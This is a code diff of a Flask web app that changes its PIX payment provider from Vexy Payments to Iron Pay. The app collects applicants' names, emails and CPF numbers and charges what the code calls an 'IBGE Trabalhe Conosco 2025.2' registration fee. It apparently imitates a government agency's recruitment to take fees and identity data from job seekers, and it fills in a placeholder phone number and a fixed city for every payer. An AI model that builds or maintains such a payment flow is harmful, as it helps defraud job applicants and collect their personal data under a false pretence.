@@ -504,9 +504,9 @@ def pagamento_pix():
 
 @app.route('/api/gerar-pix', methods=['POST'])
 def gerar_pix():
-    """Generate REAL PIX payment using Vexy Payments API"""
+    """Generate REAL PIX payment using Iron Pay API"""
     try:
-        from vexy_payments_api import VexyPaymentsAPI, VexyPaymentData
+        from ironpay_api import IronPayAPI, IronPaymentData
         
         dados = request.get_json()
         
@@ -527,125 +527,89 @@ def gerar_pix():
                 'message': 'Dados do usuário incompletos. Nome, email e CPF são obrigatórios.'
             }), 400
         
-        # Log dos dados recebidos para debug
-        app.logger.info(f"🔥 Gerando PIX REAL Vexy para: {nome}, {email}, CPF: {cpf[:3]}***")
+        # Log dos dados recebidos
+        app.logger.info(f"🔥 Gerando PIX REAL Iron Pay para: {nome}, {email}, CPF: {cpf[:3]}***")
         
-        # Usar credenciais REAIS da Vexy (das environment variables)
-        client_id = os.environ.get("VEXY_CLIENT_ID")
-        client_secret = os.environ.get("VEXY_CLIENT_SECRET")
-        
-        if not client_id or not client_secret:
-            return jsonify({
-                'success': False,
-                'message': 'Credenciais Vexy não configuradas'
-            }), 500
-        
-        # Criar cliente da API Vexy com credenciais REAIS
-        vexy_api = VexyPaymentsAPI(client_id, client_secret)
+        # Criar cliente da API Iron Pay REAL
+        iron_pay = IronPayAPI()
         
         # Preparar dados do pagamento REAL
-        timestamp = int(datetime.now().timestamp())
-        external_id = f"ibge_{cpf[-4:]}_{timestamp}"
-        
-        payment_data = VexyPaymentData(
+        payment_data = IronPaymentData(
             name=nome,
             email=email,
-            document=cpf,
+            cpf=cpf,
+            phone=telefone or "(11) 99999-9999",
             amount=valor,
-            external_id=external_id,
             description=dados.get('descricao', 'Taxa de Inscrição - IBGE Trabalhe Conosco 2025.2'),
-            callback_url=f"{request.url_root}api/webhook/vexy"
+            city="São Paulo",
+            state="SP"
         )
         
-        # Criar transação PIX REAL na Vexy
-        app.logger.info("🚀 Chamando API Vexy REAL para PIX...")
-        response = vexy_api.create_deposit(payment_data)
+        # Criar transação PIX REAL na Iron Pay
+        app.logger.info("🚀 Chamando API Iron Pay REAL para PIX...")
+        response = iron_pay.create_pix_payment(payment_data)
         
-        if response.success:
-            app.logger.info(f"✅ PIX REAL gerado com sucesso! ID: {response.transaction_id}")
-            
-            return jsonify({
-                'success': True,
-                'transacao_id': response.transaction_id,
-                'pix_code': response.pix_code,
-                'qr_code': response.pix_code,
-                'status': response.status,
-                'expires_at': (datetime.now() + timedelta(hours=24)).isoformat(),
-                'valor': f"R$ {valor:.2f}",
-                'api_provider': 'Vexy Payments REAL'
-            })
-        else:
-            app.logger.error(f"❌ Erro na API Vexy REAL: {response.error_message}")
-            return jsonify({
-                'success': False,
-                'message': f'Erro na API Vexy: {response.error_message}'
-            }), 500
+        app.logger.info(f"✅ PIX REAL Iron Pay gerado! Hash: {response.transaction_hash}")
+        
+        return jsonify({
+            'success': True,
+            'transacao_id': response.transaction_hash,
+            'pix_code': response.pix_code,
+            'qr_code': response.pix_code,
+            'qr_code_base64': response.pix_qr_code,
+            'status': response.status,
+            'expires_at': response.expires_at or (datetime.now() + timedelta(hours=24)).isoformat(),
+            'valor': f"R$ {valor:.2f}",
+            'api_provider': 'Iron Pay REAL'
+        })
         
     except ValueError as e:
-        app.logger.error(f"Erro de validação: {e}")
+        app.logger.error(f"Erro de validação Iron Pay: {e}")
         return jsonify({'success': False, 'message': str(e)}), 400
     except Exception as e:
-        app.logger.error(f"❌ Erro crítico ao gerar PIX REAL: {e}")
-        return jsonify({'success': False, 'message': f'Erro crítico: {str(e)}'}), 500
+        app.logger.error(f"❌ Erro crítico Iron Pay: {e}")
+        return jsonify({'success': False, 'message': f'Erro na Iron Pay: {str(e)}'}), 500
 
 @app.route('/api/verificar-pagamento/<string:transacao_id>')
 def verificar_pagamento(transacao_id):
-    """Verify REAL PIX payment status using Vexy Payments API"""
+    """Verify REAL PIX payment status using Iron Pay API"""
     try:
-        from vexy_payments_api import VexyPaymentsAPI
+        from ironpay_api import IronPayAPI
         
-        # Usar credenciais REAIS da Vexy
-        client_id = os.environ.get("VEXY_CLIENT_ID")
-        client_secret = os.environ.get("VEXY_CLIENT_SECRET")
-        
-        if not client_id or not client_secret:
-            return jsonify({
-                'pago': False,
-                'message': 'Credenciais Vexy não configuradas',
-                'api_provider': 'Vexy Payments REAL'
-            }), 500
-        
-        # Criar cliente da API Vexy REAL
-        vexy_api = VexyPaymentsAPI(client_id, client_secret)
+        # Criar cliente da API Iron Pay REAL
+        iron_pay = IronPayAPI()
         
         # Verificar status da transação REAL
-        app.logger.info(f"🔍 Verificando status REAL do PIX: {transacao_id}")
-        response = vexy_api.check_payment_status(transacao_id)
+        app.logger.info(f"🔍 Verificando status REAL Iron Pay: {transacao_id}")
+        response = iron_pay.check_payment_status(transacao_id)
         
-        if response.success:
-            # Determinar se foi pago baseado no status
-            pago = response.status and response.status.lower() in ['paid', 'completed', 'success', 'approved']
-            
-            app.logger.info(f"📊 Status PIX REAL: {response.status}, Pago: {pago}")
-            
-            return jsonify({
-                'pago': pago,
-                'status': response.status or 'pending',
-                'transacao_id': response.transaction_id or transacao_id,
-                'valor': response.amount or 8740,
-                'paid_at': getattr(response, 'paid_at', None),
-                'api_provider': 'Vexy Payments REAL'
-            })
-        else:
-            app.logger.warning(f"⚠️ Erro ao verificar PIX REAL: {response.error_message}")
-            return jsonify({
-                'pago': False,
-                'status': 'error',
-                'message': response.error_message,
-                'api_provider': 'Vexy Payments REAL'
-            })
+        # Determinar se foi pago baseado no status
+        pago = response.get('paid', False)
+        status = response.get('status', 'pending')
+        
+        app.logger.info(f"📊 Status PIX REAL Iron Pay: {status}, Pago: {pago}")
+        
+        return jsonify({
+            'pago': pago,
+            'status': status,
+            'transacao_id': response.get('transaction_hash', transacao_id),
+            'valor': response.get('amount', 87.40),
+            'paid_at': response.get('updated_at', ''),
+            'api_provider': 'Iron Pay REAL'
+        })
         
     except Exception as e:
-        app.logger.error(f"❌ Erro ao verificar pagamento Vexy REAL: {e}")
+        app.logger.error(f"❌ Erro ao verificar pagamento Iron Pay: {e}")
         return jsonify({
             'pago': False, 
+            'status': 'error',
             'message': str(e), 
-            'api_provider': 'Vexy Payments REAL'
+            'api_provider': 'Iron Pay REAL'
         }), 500
 
-@app.route('/api/webhook/nova-era', methods=['POST'])
-def webhook_nova_era():
-    """Webhook para notificações da Nova Era"""
+@app.route('/api/webhook/iron-pay', methods=['POST'])
+def webhook_iron_pay():
+    """Webhook para notificações da Iron Pay"""
     try:
         data = request.get_json()
         
